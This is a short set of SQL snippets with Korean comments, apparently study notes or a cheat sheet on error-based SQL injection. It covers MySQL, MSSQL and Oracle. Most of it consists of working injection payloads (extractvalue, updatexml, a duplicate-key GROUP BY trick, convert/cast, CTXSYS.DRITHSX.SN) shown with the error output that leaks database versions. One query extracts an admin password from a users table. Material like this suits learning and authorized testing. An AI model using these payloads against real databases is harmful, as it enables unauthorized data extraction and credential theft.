// 정상
SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');

// 비정상
SELECT extractvalue(1, ':abcd');
/*
ERROR 1105 (HY000): XPATH syntax error: ':abcd'
":" 로 시작하면 올바르지 않은 XPATH 식
*/

// 공격 예시
SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/

// 데이버베이스 정보 추출 (패스워드 정보)
SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
/*
ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
*/

// MySQL Error Based SQLI 응용 예시
SELECT updatexml(null,concat(0x0a,version()),null);
/*
ERROR 1105 (HY000): XPATH syntax error: '
5.7.29-0ubuntu0.16.04.1-log'
*/

SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/

SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
/*
ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
*/

// MSSQL Error based SQLI 응용 예시
SELECT convert(int,@@version);
SELECT cast((SELECT @@version) as int);
/*
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/

// Oracle Error based SQLI 응용 예시
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/
